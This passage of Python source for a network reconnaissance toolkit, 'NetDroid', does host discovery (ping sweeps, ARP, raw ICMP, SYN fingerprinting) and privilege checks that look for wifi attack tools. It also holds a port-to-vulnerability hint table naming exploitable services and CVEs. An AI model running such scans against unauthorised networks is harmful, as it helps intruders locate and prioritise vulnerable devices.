         "dica": "PostgreSQL exposto — verificar pg_hba", "severidade": "alta"},
    ],
    5900: [
        {"servico": "vnc", "regex": r".*",
         "dica": "VNC exposto — comum sem senha em LAN", "severidade": "alta"},
    ],
    6379: [
        {"servico": "redis", "regex": r".*",
         "dica": "Redis exposto sem auth — RCE via CONFIG SET", "severidade": "critica"},
    ],
    7547: [
        {"servico": "tr-069", "regex": r".*",
         "dica": "TR-069 exposto — Mirai variants (CVE-2016-10372)", "severidade": "alta"},
    ],
    8080: [
        {"servico": "http-proxy", "regex": r"(?i)tomcat",
         "dica": "Tomcat exposto — manager/html com creds default", "severidade": "alta"},
    ],
    9200: [
        {"servico": "elasticsearch", "regex": r".*",
         "dica": "Elasticsearch sem auth — vazamento de dados", "severidade": "critica"},
    ],
    11211: [
        {"servico": "memcached", "regex": r".*",
         "dica": "Memcached exposto — amplificação UDP massiva", "severidade": "alta"},
    ],
    27017: [
        {"servico": "mongodb", "regex": r".*",
         "dica": "MongoDB sem auth — vazamento de dados", "severidade": "critica"},
    ],
    37777: [
        {"servico": "dahua", "regex": r".*",
         "dica": "Dahua DVR — CVE-2021-33044 / 33045 bypass", "severidade": "critica"},
    ],
}

# ──────────── Heurísticas de classificação de dispositivo ─────
# Avaliadas em ordem; primeiro match define o tipo. Use chaves PT-BR.
DEVICE_HEURISTICS = [
    {"tipo": "roteador",        "is_gateway": True},
    {"tipo": "camera_ip",       "vendor_in": ["Hikvision", "Dahua", "Axis", "Foscam",
                                                "Amcrest", "Reolink", "Wyze", "Tuya"]},
    {"tipo": "camera_ip",       "porta_qualquer": [554, 8554, 37777, 34567]},
    {"tipo": "impressora",      "vendor_in": ["HP", "Epson", "Brother", "Canon",
                                                "Samsung-Printer", "Kyocera"]},
    {"tipo": "impressora",      "porta_qualquer": [9100, 631, 515]},
    {"tipo": "nas",             "vendor_in": ["Synology", "QNAP"]},
    {"tipo": "nas",             "porta_qualquer": [548, 5000, 5001, 8080]},
    {"tipo": "voip",            "vendor_in": ["Grandstream"]},
    {"tipo": "voip",            "porta_qualquer": [5060, 5061]},
    {"tipo": "windows_pc",      "porta_qualquer": [445, 139, 3389, 135]},
    {"tipo": "windows_pc",      "ttl_em": ["Windows"]},
    {"tipo": "linux_servidor",  "porta_qualquer": [22, 2049, 5432, 27017, 6379]},
    {"tipo": "linux_servidor",  "ttl_em": ["Linux"]},
    {"tipo": "mobile",          "ttl_em": ["iOS"]},
    {"tipo": "mobile",          "vendor_in": ["Apple", "Samsung", "Xiaomi", "Huawei",
                                                "LG", "Sony"]},
    {"tipo": "iot_generico",    "vendor_in": ["Tuya", "Wyze", "Eufy", "Sonos", "Roku",
                                                "Amazon", "Google-Nest"]},
]

# ════════════════════ BANNER ASCII ════════════════════════════
BANNER = r"""
[bold #ff003c]
    _   __     __     ____             _     __
   / | / /__  / /_   / __ \_________  (_)___/ /
  /  |/ / _ \/ __/  / / / / ___/ __ \/ / __  / 
 / /|  /  __/ /_   / /_/ / /  / /_/ / / /_/ /  
/_/ |_/\___/\__/  /_____/_/   \____/_/\__,_/   
[/bold #ff003c]
[dim #555555]          ⟨ Professional Network Analysis Toolkit ⟩[/dim #555555]
[dim #555555]              v{version} · No Root · Termux Ready[/dim #555555]
"""

# ══════════════════ CONTEXTO DE PRIVILÉGIO ════════════════════
# Detecta SO + valida privilégio (admin/root/su) e expõe capabilities.
# Uma única flag `--root` aciona o motor correto por SO.

class ContextoPrivilegio:
    """Centraliza detecção de plataforma e privilégio.

    plataforma : "windows" | "linux" | "termux"
    motor      : "adm" | "root-kali" | "root-termux"
    ativo      : True se --root foi passado e privilégio confirmado
    capabilities : conjunto de strings com recursos disponíveis
    """

    def __init__(self):
        self.plataforma: str = ""
        self.motor: str = ""
        self.ativo: bool = False
        self.capabilities: Set[str] = set()
        self.detalhes: Dict[str, Any] = {}

    @classmethod
    def detectar_plataforma(cls) -> str:
        if IS_WINDOWS:
            return "windows"
        if IS_TERMUX:
            return "termux"
        return "linux"

    @classmethod
    def detectar_e_validar(cls, ui: "TerminalUI") -> Optional["ContextoPrivilegio"]:
        """Detecta SO, confere privilégio. Retorna instância ATIVA se ok,
        None se falhar (ui já reporta o erro)."""
        ctx = cls()
        ctx.plataforma = cls.detectar_plataforma()
        ok = False
        if ctx.plataforma == "windows":
            ctx.motor = "adm"
            ok = ctx._validar_admin_windows()
        elif ctx.plataforma == "termux":
            ctx.motor = "root-termux"
            ok = ctx._validar_root_termux()
        else:
            ctx.motor = "root-kali"
            ok = ctx._validar_root_linux()

        if not ok:
            ui.error(f"--root requisitado mas privilégio insuficiente "
                     f"(plataforma: {ctx.plataforma}, motor esperado: {ctx.motor}).")
            ctx._dica_como_obter(ui)
            return None

        ctx.ativo = True
        ctx._descobrir_capabilities()
        ctx._imprimir_banner(ui)
        return ctx

    def _validar_admin_windows(self) -> bool:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    def _validar_root_linux(self) -> bool:
        try:
            if hasattr(os, "geteuid") and os.geteuid() == 0:
                # Confirma com teste de raw socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    s.close()
                    self.capabilities.add("raw_socket")
                except Exception:
                    pass
                return True
        except Exception:
            return False
        return False

    def _validar_root_termux(self) -> bool:
        if not HAS_SU:
            return False
        try:
            saida = subprocess.check_output(["su", "-c", "id"],
                                             timeout=5, stderr=subprocess.DEVNULL)
            return b"uid=0" in saida
        except Exception:
            return False

    def _descobrir_capabilities(self):
        # Capabilities universais (já detectadas globalmente)
        if HAS_SCAPY:    self.capabilities.add("scapy")
        if HAS_NMAP_BIN: self.capabilities.add("nmap")
        # Por motor
        if self.motor == "root-kali":
            if HAS_AIREPLAY:  self.capabilities.add("aireplay")
            if HAS_AIRMON:    self.capabilities.add("airmon")
            if HAS_MDK4:      self.capabilities.add("mdk4")
            if HAS_TCPDUMP:   self.capabilities.add("tcpdump")
            if HAS_IW:        self.capabilities.add("iw")
            if HAS_ARPSCAN:   self.capabilities.add("arp-scan")
            if HAS_IPTABLES:  self.capabilities.add("iptables")
            self.capabilities.add("raw_socket")
            try:
                if os.path.exists("/sys/class/thermal/thermal_zone0/temp"):
                    self.capabilities.add("thermal_monitor")
            except Exception:
                pass
        elif self.motor == "root-termux":
            if HAS_AIREPLAY:  self.capabilities.add("aireplay")
            if HAS_AIRMON:    self.capabilities.add("airmon")
            if HAS_MDK4:      self.capabilities.add("mdk4")
            if HAS_TCPDUMP:   self.capabilities.add("tcpdump")
            if HAS_IW:        self.capabilities.add("iw")
            if HAS_IPTABLES:  self.capabilities.add("iptables")
            self.capabilities.add("raw_socket")
            self.capabilities.add("su")
            try:
                if os.path.exists("/sys/class/thermal/thermal_zone0/temp"):
                    self.capabilities.add("thermal_monitor")
            except Exception:
                pass
        elif self.motor == "adm":
            if HAS_NETSH:       self.capabilities.add("netsh")
            if HAS_PKTMON:      self.capabilities.add("pktmon")
            if HAS_POWERSHELL:  self.capabilities.add("powershell")
            self.capabilities.add("raw_socket")  # Admin libera raw socket no Windows

    def _dica_como_obter(self, ui: "TerminalUI"):
        if self.plataforma == "windows":
            ui.info("Como obter: abra PowerShell/cmd como ADMINISTRADOR e rode novamente.")
        elif self.plataforma == "termux":
            ui.info("Como obter: instale Magisk/su no Android, conceda permissão ao Termux,")
            ui.info("              rode `pkg install tsu` e use `tsu` para virar root.")
        else:
            ui.info("Como obter: execute com `sudo python NetDroid.py ...` ou troque para root.")

    def _imprimir_banner(self, ui: "TerminalUI"):
        ui.section(f"PRIVILEGE MODE ATIVADO — {self.motor.upper()}")
        ui.success(f"Plataforma: {self.plataforma} | Motor: {self.motor}")
        if self.capabilities:
            ui.info(f"Capabilities ({len(self.capabilities)}): "
                    f"{', '.join(sorted(self.capabilities))}")
        # Hints sobre capabilities ausentes úteis
        ausentes = []
        if self.motor == "root-kali":
            for cap, hint in [("aireplay", "apt install aircrack-ng"),
                              ("mdk4", "apt install mdk4"),
                              ("tcpdump", "apt install tcpdump"),
                              ("scapy", "pip install scapy")]:
                if cap not in self.capabilities:
                    ausentes.append(f"{cap} ({hint})")
        elif self.motor == "root-termux":
            for cap, hint in [("aireplay", "pkg install aircrack-ng"),
                              ("tcpdump", "pkg install tcpdump"),
                              ("scapy", "pip install scapy")]:
                if cap not in self.capabilities:
                    ausentes.append(f"{cap} ({hint})")
        elif self.motor == "adm":
            if "scapy" not in self.capabilities:
                ausentes.append("scapy (pip install scapy) + NPCAP para 802.11")
        if ausentes:
            ui.warn(f"Ausentes (instale para máximo poder): {' | '.join(ausentes)}")

    def resumo(self) -> Dict[str, Any]:
        return {
            "plataforma": self.plataforma,
            "motor": self.motor,
            "ativo": self.ativo,
            "capabilities": sorted(self.capabilities),
        }


# Variável global única — set no main_async se --root passou
ctx_priv: Optional[ContextoPrivilegio] = None


def priv_ativo() -> bool:
    return ctx_priv is not None and ctx_priv.ativo


def tem_cap(c: str) -> bool:
    return priv_ativo() and c in ctx_priv.capabilities


def temperatura_cpu() -> float:
    """Lê /sys/class/thermal/thermal_zone0/temp e retorna °C. -1 se indisponível."""
    try:
        with open("/sys/class/thermal/thermal_zone0/temp", "r") as f:
            v = int(f.read().strip())
            return v / 1000.0 if v > 1000 else float(v)
    except Exception:
        return -1.0


# ══════════════════ TERMINAL UI ═══════════════════════════════

class TerminalUI:
    """Cyberpunk terminal interface powered by rich."""

    def __init__(self):
        if HAS_RICH:
            try:
                self.console = Console(force_terminal=True, theme=None)
            except Exception:
                self.console = Console()
        else:
            self.console = None
        self.start_time = time.time()

    def boot_sequence(self):
        if not self.console:
            return
        
        stages = [
            ("Initializing Neural Link...", 0.3),
            ("Loading NetDroid Kernels...", 0.4),
            ("Syncing Network Protocols...", 0.3),
            ("Calibrating Port Sensors...", 0.5),
            ("Establishing Secure Sandbox...", 0.2),
        ]
        
        with Live(vertical_overflow="visible", console=self.console) as live:
            for msg, duration in stages:
                live.update(Panel(f"[bold {C_CYAN}]{msg}[/]", border_style=C_DIM))
                time.sleep(duration)
            
            # Glitch effect animation
            for _ in range(3):
                live.update(Panel(f"[bold {C_RED}]SYSTEM ONLINE[/]", border_style=C_RED))
                time.sleep(0.1)
                live.update(Panel(f"[bold {C_WHITE}]SYSTEM ONLINE[/]", border_style=C_WHITE))
                time.sleep(0.1)
        
        self.console.clear()
        self.banner()

    def banner(self):
        if self.console:
            try:
                self.console.print(BANNER.format(version=VERSION))
                self.console.print(f"  [{C_DIM}]Launch Time:[/] [bold {C_PURPLE}]{datetime.now().strftime('%H:%M:%S')}[/]\n")
            except (UnicodeEncodeError, Exception):
                print(f"\n  NetDroid v{VERSION} — Network Analysis Toolkit\n")
        else:
            print(f"\n  NetDroid v{VERSION} — Network Analysis Toolkit\n")

    def info(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_CYAN}]➤[/{C_CYAN}] {msg}")
        else:
            print(f"  [*] {msg}")

    def success(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_GREEN}]✔[/{C_GREEN}] {msg}")
        else:
            print(f"  [+] {msg}")

    def warn(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_YELLOW}]⚡[/{C_YELLOW}] {msg}")
        else:
            print(f"  [!] {msg}")

    def error(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_RED}]☢[/{C_RED}] {msg}")
        else:
            print(f"  [-] {msg}")

    def section(self, title: str):
        if self.console:
            p = Panel(
                Text(title, justify="center", style=f"bold {C_WHITE}"),
                border_style=C_RED,
                box=box.HORIZONTALS,
                padding=(0, 2)
            )
            self.console.print(f"\n")
            self.console.print(p)
        else:
            print(f"\n{'=' * 40}\n {title}\n{'=' * 40}")

    def table(self, title: str, columns: List[Tuple[str, str]], rows: List[List[str]]):
        if self.console:
            t = Table(title=title, box=box.SIMPLE_HEAVY, border_style=C_RED,
                      title_style=f"bold {C_WHITE}", header_style=f"bold {C_CYAN}")
            for name, style in columns:
                t.add_column(name, style=style)
            for row in rows:
                t.add_row(*row)
            self.console.print(t)
        else:
            print(f"\n  {title}")
            for row in rows:
                print(f"    {'  |  '.join(row)}")

    def progress(self, description: str = "Working"):
        if self.console:
            return Progress(
                SpinnerColumn("dots", style=C_RED),
                TextColumn(f"[{C_WHITE}]{{task.description}}[/{C_WHITE}]"),
                BarColumn(bar_width=30, style=C_DIM, complete_style=C_RED),
                TextColumn(f"[{C_GREEN}]{{task.percentage:>3.0f}}%[/{C_GREEN}]"),
                TimeElapsedColumn(),
                console=self.console,
            )
        return None

    def elapsed(self) -> str:
        e = time.time() - self.start_time
        return f"{e:.1f}s"

    def consent(self, message: str) -> bool:
        if self.console:
            self.console.print(f"\n  [{C_YELLOW}]⚠ {message}[/{C_YELLOW}]")
        else:
            print(f"\n  [!] {message}")
        try:
            resp = input("  ➤ Confirmar? [y/N]: ").strip().lower()
            return resp in ("y", "yes", "s", "sim")
        except (KeyboardInterrupt, EOFError):
            return False


# ═════════════════ NETWORK DETECTOR ═══════════════════════════

class NetworkDetector:
    """Auto-detect gateway, subnet, local IP, SSID. Creates output dir."""

    def __init__(self, ui: TerminalUI, target: Optional[str] = None):
        self.ui = ui
        self.target = target
        self.gateway: Optional[str] = None
        self.local_ip: Optional[str] = None
        self.subnet: Optional[str] = None
        self.ssid: Optional[str] = None
        self.iface: Optional[str] = None
        self.output_dir: Optional[Path] = None

    def detect(self) -> bool:
        self.ui.section("NETWORK DETECTION")
        if self.target:
            self.ui.info(f"Target manual: [bold]{self.target}[/bold]")
            self._resolve_target()
        else:
            self._auto_detect()
        if not self.local_ip:
            self.ui.error("Falha ao detectar rede. Use --t para definir alvo manual.")
            return False
        self._detect_ssid()
        self._create_output_dir()
        self._print_summary()
        return True

    def _resolve_target(self):
        try:
            net = ipaddress.ip_network(self.target, strict=False)
            self.subnet = str(net)
            self.gateway = str(next(net.hosts()))
        except ValueError:
            self.subnet = f"{self.target}/32"
            self.gateway = self.target
        self._detect_local_ip()

    def _auto_detect(self):
        self._detect_gateway_linux()
        if not self.gateway:
            self._detect_gateway_socket()
        if self.gateway:
            self._detect_local_ip()
            if self.local_ip and not self.subnet:
                net = ipaddress.ip_network(f"{self.local_ip}/24", strict=False)
                self.subnet = str(net)

    def _detect_gateway_linux(self):
        if IS_WINDOWS:
            self._detect_gateway_windows()
            return
        try:
            out = subprocess.check_output(["ip", "route"], text=True, timeout=5)
            for line in out.splitlines():
                if line.startswith("default"):
                    parts = line.split()
                    gw_idx = parts.index("via") + 1 if "via" in parts else -1
                    if gw_idx > 0:
                        self.gateway = parts[gw_idx]
                    if "dev" in parts:
                        self.iface = parts[parts.index("dev") + 1]
                    break
        except Exception:
            pass

    def _detect_gateway_windows(self):
        try:
            out = subprocess.check_output(
                ["ipconfig"], text=True, timeout=5, encoding="cp850",
                errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                if "Default Gateway" in line or "Gateway padr" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        gw = parts[1].strip()
                        if gw and re.match(r"\d+\.\d+\.\d+\.\d+", gw):
                            self.gateway = gw
                            return
        except Exception:
            pass

    def _detect_gateway_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            parts = self.local_ip.rsplit(".", 1)
            self.gateway = f"{parts[0]}.1"
        except Exception:
            pass

    def _detect_local_ip(self):
        if self.local_ip:
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.gateway or "8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass

    def _detect_ssid(self):
        if IS_WINDOWS:
            self._detect_ssid_windows()
            return
        methods = [
            ["termux-wifi-connectioninfo"],
            ["iwgetid", "-r"],
            ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"],
        ]
        for cmd in methods:
            try:
                out = subprocess.check_output(cmd, text=True, timeout=5).strip()
                if cmd[0] == "termux-wifi-connectioninfo":
                    data = json.loads(out)
                    ssid = data.get("ssid", "").strip('"')
                    if ssid and ssid != "<unknown ssid>":
                        self.ssid = ssid
                        return
                elif cmd[0] == "nmcli":
                    for line in out.splitlines():
                        if line.startswith("yes:"):
                            self.ssid = line.split(":", 1)[1]
                            return
                elif out:
                    self.ssid = out
                    return
            except Exception:
                continue
        self.ssid = "UnknownNetwork"

    def _detect_ssid_windows(self):
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True, timeout=5, encoding="cp850", errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                if "SSID" in line and "BSSID" not in line:
                    parts = line.split(":", 1)
                    if len(parts) >= 2:
                        ssid = parts[1].strip()
                        if ssid:
                            self.ssid = ssid
                            return
        except Exception:
            pass
        self.ssid = "UnknownNetwork"

    def _create_output_dir(self):
        safe_name = re.sub(r'[^\w\-.]', '_', self.ssid or "scan")
        self.output_dir = Path(safe_name)
        self.output_dir.mkdir(exist_ok=True)

    def _print_summary(self):
        rows = [
            ["Local IP", self.local_ip or "N/A"],
            ["Gateway", self.gateway or "N/A"],
            ["Subnet", self.subnet or "N/A"],
            ["SSID", self.ssid or "N/A"],
            ["Interface", self.iface or "N/A"],
            ["Output Dir", str(self.output_dir or "N/A")],
        ]
        self.ui.table("Network Info", [("Parameter", C_CYAN), ("Value", C_GREEN)], rows)

    def get_hosts(self) -> List[str]:
        try:
            net = ipaddress.ip_network(self.subnet, strict=False)
            return [str(h) for h in net.hosts()]
        except Exception:
            return []


# ═════════════════ HOST DISCOVERY ═════════════════════════════

class HostDiscovery:
    """Inteligência de descoberta militar: ARP, ping, TCP probe, TTL,
    mDNS, NetBIOS, SSDP, SMB, HTTP-title, DHCP leases e nmap opcional.
    Classifica cada host por tipo e gera score de confiança."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector):
        self.ui = ui
        self.det = detector
        self.hosts: List[Dict[str, Any]] = []
        self._arp_cache: Dict[str, str] = {}
        self._dhcp_map: Dict[str, str] = {}

    async def discover(self) -> List[Dict[str, Any]]:
        self.ui.section("HOST DISCOVERY")
        emitir("fase", nome="DESCOBERTA — varredura inicial", indice="1/3")
        self._read_arp_cache()
        self._dhcp_map = self._ler_dhcp_leases()
        candidates = self.det.get_hosts()
        if not candidates:
            self.ui.error("Nenhum host candidato encontrado.")
            return []
        self.ui.info(f"Subnet: {self.det.subnet} — {len(candidates)} hosts possíveis")
        alive = await self._ping_sweep(candidates)
        tcp_extra = await self._tcp_probe_missing(candidates, alive)
        alive.update(tcp_extra)
        for ip in sorted(alive, key=lambda x: ipaddress.ip_address(x)):
            host = self._build_host_info(ip, alive[ip])
            self.hosts.append(host)
            emitir("host_found", **host)

        # Camada de Inteligência Total (paralela, não-bloqueante por host)
        if self.hosts:
            emitir("fase", nome="DESCOBERTA — enriquecimento (mDNS/SMB/HTTP/...)", indice="1/3")
            await self._enriquecer_hosts()
            for h in self.hosts:
                self._classificar_dispositivo(h)
                self._calcular_confianca(h)
                emitir("host_update", **h)

        self._print_results()
        return self.hosts

    def _read_arp_cache(self):
        if IS_WINDOWS:
            self._read_arp_cache_windows()
            return
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[2] != "0x0":
                        ip, mac = parts[0], parts[3].upper()
                        if mac != "00:00:00:00:00:00":
                            self._arp_cache[ip] = mac
            if self._arp_cache:
                self.ui.success(f"ARP cache: {len(self._arp_cache)} entradas lidas")
        except FileNotFoundError:
            self.ui.warn("ARP cache indisponível (não-Linux)")
        except Exception:
            pass

    def _read_arp_cache_windows(self):
        try:
            out = subprocess.check_output(
                ["arp", "-a"], text=True, timeout=5, errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([-\da-fA-F]+)\s+", line)
                if m:
                    ip = m.group(1)
                    mac = m.group(2).upper().replace("-", ":")
                    if mac != "FF:FF:FF:FF:FF:FF":
                        self._arp_cache[ip] = mac
            if self._arp_cache:
                self.ui.success(f"ARP cache: {len(self._arp_cache)} entradas lidas")
        except Exception:
            pass

    async def _ping_sweep(self, candidates: List[str]) -> Dict[str, float]:
        alive: Dict[str, float] = {}
        sem = asyncio.Semaphore(CONCURRENT_LIMIT)

        async def ping_one(ip: str):
            async with sem:
                try:
                    cmd = (["ping", "-n", "1", "-w", str(PING_TIMEOUT * 1000), ip]
                           if IS_WINDOWS else
                           ["ping", "-c", "1", "-W", str(PING_TIMEOUT), ip])
                    proc = await asyncio.create_subprocess_exec(
                        *cmd, stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL)
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=PING_TIMEOUT + 1)
                    if proc.returncode == 0:
                        out = stdout.decode(errors="ignore")
                        m = re.search(r"time[=<]\s*([\d.]+)", out)
                        latency = float(m.group(1)) if m else 0.0
                        alive[ip] = latency
                except Exception:
                    pass

        progress = self.ui.progress("Ping Sweep")
        if progress:
            with progress:
                task = progress.add_task("Ping sweep...", total=len(candidates))
                batch_size = 50
                for i in range(0, len(candidates), batch_size):
                    batch = candidates[i:i + batch_size]
                    await asyncio.gather(*[ping_one(ip) for ip in batch])
                    progress.update(task, advance=len(batch))
        else:
            await asyncio.gather(*[ping_one(ip) for ip in candidates])

        self.ui.success(f"Ping sweep: {len(alive)} hosts responderam")
        return alive

    async def _tcp_probe_missing(self, candidates: List[str],
                                  alive: Dict[str, float]) -> Dict[str, float]:
        missing = [ip for ip in candidates if ip not in alive]
        if not missing:
            return {}
        found: Dict[str, float] = {}
        probe_ports = [80, 443, 22, 8080, 8443]
        sem = asyncio.Semaphore(CONCURRENT_LIMIT)

        async def probe(ip: str):
            async with sem:
                for port in probe_ports:
                    try:
                        _, w = await asyncio.wait_for(
                            asyncio.open_connection(ip, port), timeout=1.0)
                        w.close()
                        await w.wait_closed()
                        found[ip] = 0.0
                        return
                    except Exception:
                        continue

        self.ui.info(f"TCP probe em {len(missing)} hosts silenciosos...")
        batch_size = 100
        for i in range(0, len(missing), batch_size):
            batch = missing[i:i + batch_size]
            await asyncio.gather(*[probe(ip) for ip in batch])

        if found:
            self.ui.success(f"TCP probe: +{len(found)} hosts adicionais")
        return found

    def _build_host_info(self, ip: str, latency: float) -> Dict[str, Any]:
        mac = self._arp_cache.get(ip, "N/A")
        vendor = self._lookup_vendor(mac)
        os_guess = self._ttl_fingerprint(ip)
        is_gw = ip == self.det.gateway
        fontes: List[str] = []
        if mac != "N/A":
            fontes.append("arp")
        if os_guess != "Unknown":
            fontes.append("ttl")
        host: Dict[str, Any] = {
            "ip": ip, "mac": mac, "vendor": vendor, "os": os_guess,
            "latency_ms": round(latency, 2), "is_gateway": is_gw,
            "ports": [], "services": {},
            # campos de inteligência expandida
            "hostname": "",
            "device_type": "desconhecido",
            "fontes": fontes,
            "confiancas": {},
            "vulns": [],
            "extra": {},  # dicionário livre para SSDP/HTTP/SMB metadata
        }
        # DHCP lease já oferece hostname?
        if ip in self._dhcp_map:
            host["hostname"] = self._dhcp_map[ip]
            host["fontes"].append("dhcp")
        return host

    def _lookup_vendor(self, mac: str) -> str:
        if mac == "N/A":
            return "Unknown"
        prefix = mac[:8].upper()
        return MAC_VENDORS.get(prefix, "Unknown")

    def _ttl_fingerprint(self, ip: str) -> str:
        try:
            cmd = (["ping", "-n", "1", "-w", "1000", ip]
                   if IS_WINDOWS else
                   ["ping", "-c", "1", "-W", "1", ip])
            out = subprocess.check_output(
                cmd,
                text=True, timeout=3, stderr=subprocess.DEVNULL)
            m = re.search(r"ttl[=:](\d+)", out, re.IGNORECASE)
            if m:
                ttl = int(m.group(1))
                if ttl <= 64:
                    return "Linux/Android"
                elif ttl <= 128:
                    return "Windows"
                else:
                    return "iOS/Cisco/Network"
        except Exception:
            pass
        return "Unknown"

    # ─── Camada de Inteligência ─────────────────────────────────

    async def _enriquecer_hosts(self):
        """Roda em paralelo todas as técnicas passivas/leves de identificação."""
        self.ui.info("Inteligência total: mDNS, NetBIOS, SSDP, SMB, HTTP, nmap...")
        loop = asyncio.get_event_loop()
        tarefas = []
        for h in self.hosts:
            tarefas.append(self._enriquecer_host_unico(h, loop))
        if tarefas:
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _enriquecer_host_unico(self, host: Dict[str, Any], loop):
        ip = host["ip"]
        # Técnicas que rodam em executor (socket bloqueante)
        try:
            mdns_nome = await loop.run_in_executor(None, self._consultar_mdns, ip)
            if mdns_nome:
                if not host["hostname"]:
                    host["hostname"] = mdns_nome
                host["extra"]["mdns"] = mdns_nome
                host["fontes"].append("mdns")
        except Exception:
            pass
        try:
            nb_nome = await loop.run_in_executor(None, self._consultar_netbios, ip)
            if nb_nome:
                if not host["hostname"]:
                    host["hostname"] = nb_nome
                host["extra"]["netbios"] = nb_nome
                host["fontes"].append("netbios")
        except Exception:
            pass
        try:
            ssdp_meta = await loop.run_in_executor(None, self._sondar_ssdp, ip)
            if ssdp_meta:
                host["extra"]["ssdp"] = ssdp_meta
                host["fontes"].append("ssdp")
                if not host["hostname"] and ssdp_meta.get("server"):
                    host["hostname"] = ssdp_meta["server"][:60]
        except Exception:
            pass
        try:
            smb_dialeto = await loop.run_in_executor(None, self._banner_smb, ip)
            if smb_dialeto:
                host["extra"]["smb"] = smb_dialeto
                host["fontes"].append("smb")
                if "Windows" not in host["os"] and "SMB" in smb_dialeto:
                    host["os"] = "Windows (SMB)"
        except Exception:
            pass
        # HTTP hostname é async puro (aiohttp) ou socket fallback
        try:
            http_meta = await self._coletar_http(ip)
            if http_meta:
                host["extra"]["http"] = http_meta
                host["fontes"].append("http")
                if not host["hostname"] and http_meta.get("title"):
                    host["hostname"] = http_meta["title"][:60]
        except Exception:
            pass
        # nmap OS detection — opcional, só se o binário estiver disponível
        if HAS_NMAP_BIN:
            try:
                nmap_os = await self._nmap_os(ip)
                if nmap_os:
                    host["extra"]["nmap_os"] = nmap_os
                    host["fontes"].append("nmap")
                    if host["os"] in ("Unknown", "Linux/Android", "Windows", "iOS/Cisco/Network"):
                        host["os"] = nmap_os
            except Exception:
                pass

        # ─── Boost --root: técnicas privilegiadas adicionais ───
        if priv_ativo():
            try:
                await self._enriquecer_root(host, loop)
            except Exception:
                pass

    async def _enriquecer_root(self, host: Dict[str, Any], loop):
        """Enriquecimento adicional disponível só sob --root.
        Adiciona em host['fontes']: raw_arp, raw_icmp, syn_fp."""
        ip = host["ip"]
        # 1) Raw ICMP echo (mede TTL real e RTT sem subprocess ping)
        if "raw_socket" in (ctx_priv.capabilities if ctx_priv else set()):
            try:
                ttl, rtt = await loop.run_in_executor(None, self._raw_icmp_echo, ip)
                if ttl > 0:
                    host["extra"]["raw_icmp"] = {"ttl": ttl, "rtt_ms": rtt}
                    host["fontes"].append("raw_icmp")
                    if host.get("os", "Unknown") == "Unknown":
                        host["os"] = self._inferir_os_por_ttl(ttl)
            except Exception:
                pass
        # 2) Raw ARP active probe (scapy)
        if tem_cap("scapy") and ctx_priv and ctx_priv.motor in ("root-kali", "root-termux"):
            try:
                mac = await loop.run_in_executor(None, self._raw_arp_probe, ip)
                if mac and host.get("mac", "N/A") in ("N/A", ""):
                    host["mac"] = mac
                    host["fontes"].append("raw_arp")
                    host["vendor"] = self._lookup_vendor(mac)
            except Exception:
                pass
        # 3) SYN fingerprint (TTL + window + flags) para refinar OS
        if tem_cap("scapy"):
            try:
                fp = await loop.run_in_executor(None, self._syn_fingerprint, ip)
                if fp:
                    host["extra"]["syn_fp"] = fp
                    host["fontes"].append("syn_fp")
                    if fp.get("os_palpite"):
                        host["os"] = fp["os_palpite"]
            except Exception:
                pass

    def _raw_icmp_echo(self, ip: str) -> Tuple[int, float]:
        """Envia 1 pacote ICMP echo via raw socket. Retorna (ttl, rtt_ms).
        Requer privilégio root/admin (já validado em ctx_priv)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.settimeout(1.0)
            ident = os.getpid() & 0xFFFF
            seq = 1
            # Header ICMP: type(8)=echo, code=0, checksum=0, ident, seq + payload
            payload = b"NetDroid-RAW-Probe"
            cab = struct.pack("!BBHHH", 8, 0, 0, ident, seq) + payload
            # Cálculo de checksum
            def chk(data):
                if len(data) % 2: data += b"\x00"
                s_ = 0
                for i in range(0, len(data), 2):
                    s_ += (data[i] << 8) | data[i+1]
                s_ = (s_ >> 16) + (s_ & 0xFFFF)
                s_ += s_ >> 16
                return ~s_ & 0xFFFF
            cs = chk(cab)
            cab = struct.pack("!BBHHH", 8, 0, cs, ident, seq) + payload
            t0 = time.time()
            s.sendto(cab, (ip, 0))
            data, _ = s.recvfrom(1024)
            rtt = (time.time() - t0) * 1000.0
            s.close()
            ttl = data[8] if len(data) > 8 else 0
            return ttl, round(rtt, 2)
        except Exception:
            return 0, 0.0

    def _inferir_os_por_ttl(self, ttl: int) -> str:
        if ttl <= 0:    return "Unknown"
        if ttl <= 64:   return "Linux/Android (TTL 64)"
        if ttl <= 128:  return "Windows (TTL 128)"
        return "iOS/Cisco/Network (TTL 255)"

    def _raw_arp_probe(self, ip: str) -> str:
        """Probe ARP via scapy. Retorna MAC ou ''."""
        if not HAS_SCAPY:
            return ""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=1, verbose=False, retry=1)
            for _, r in ans:
                return r[Ether].src.upper()
        except Exception:
            return ""
        return ""

    def _syn_fingerprint(self, ip: str) -> Dict[str, Any]:
        """SYN para 80/443/22, lê TTL/window/MSS para palpite de OS."""
